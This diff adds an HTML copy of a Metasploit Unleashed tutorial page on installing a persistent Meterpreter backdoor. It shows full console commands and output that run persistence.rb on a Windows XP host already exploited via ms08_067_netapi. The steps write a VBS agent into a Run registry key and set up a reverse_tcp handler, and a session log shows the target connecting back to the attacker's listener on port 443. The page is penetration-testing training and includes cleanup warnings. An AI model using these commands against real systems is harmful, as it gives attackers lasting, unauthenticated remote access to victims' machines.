@@ -1,0 +1,67 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Persistent Meterpreter Service</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Persistent
+Meterpreter Service</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">After going through all the hard work
+of exploiting a system, it's
+often a good idea to leave yourself an easier way back into the system
+later. This way, if the service you exploited is down or patched, you
+can still gain access to the system. Metasploit has a Meterpreter
+script, persistence.rb, that will create a Meterpreter service that
+will be available to you even if the remote system is rebooted.
+</p>
+<p style="color: rgb(0, 0, 0);">One word of warning here before we go
+any further. The
+persistent Meterpreter as shown here requires no authentication. This
+means that anyone that gains access to the port could access your back
+door! This is not a good thing if you are conducting a penetration
+test, as this could be a significant risk. In a real world situation,
+be sure to exercise the utmost caution and be sure to clean up after
+yourself when the engagement is done.
+</p>
+<p style="color: rgb(0, 0, 0);">Once we've initially exploited the
+host, we run the persistence script with the '-h' switch to see which
+options are available:
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run persistence -h<br><br>OPTIONS:<br><br>    -A        Automatically start a matching multi/handler to connect to the agent<br>    -U        Automatically start the agent when the User logs on<br>    -X        Automatically start the agent when the system boots<br>    -h        This help menu<br>    -i   The interval in seconds between each connection attempt<br>    -p   The port on the remote host where Metasploit is listening<br>    -r   The IP of the system running Metasploit listening for the connect back</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">We will configure our persistent
+Meterpreter session to wait until
+a user logs on to the remote system and try to connect back to our
+listener every 5 seconds at IP address 192.168.1.71 on port 443.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run persistence -U -i 5 -p 443 -r 192.168.1.71<br>[*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)<br>[*] Persistent agent script is 613976 bytes long<br>[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs<br>[*] Agent executed with PID 492<br>[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr<br>[*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr<br>[*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc<br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Notice that the script output gives
+you the command to remove the
+persistent listener when you are done with it. Be sure to make note of
+it so you don't leave an unauthenticated backdoor on the system. To
+verify that it works, we reboot the remote system and set up our
+payload handler.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; reboot<br>Rebooting...<br><u>meterpreter</u> &gt; exit<br><br>[*] Meterpreter session 3 closed.  Reason: User exit<br>msf exploit(ms08_067_netapi) &gt; use exploit/multi/handler<br>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(handler) &gt; set LHOST 192.168.1.71<br>LHOST =&gt; 192.168.1.71<br>msf exploit(handler) &gt; set LPORT 443<br>LPORT =&gt; 443<br>msf exploit(handler) &gt; exploit<br><br>[*] Started reverse handler on 192.168.1.71:443<br>[*] Starting the payload handler...</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">When a user logs in to the remote
+system, a Meterpreter session is opened up for us.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">[*] Sending stage (748544 bytes) to 192.168.1.161<br>[*] Meterpreter session 5 opened (192.168.1.71:443 -&gt; 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: XEN-XP-SP2-BARE<br>OS      : Windows XP (Build 2600, Service Pack 2).<br>Arch    : x86<br>Language: en_US<br><u>meterpreter</u> &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Maintaining_Access"
+ title="Maintaining Access">Maintaining Access</a></div>
+</body>
+</html>
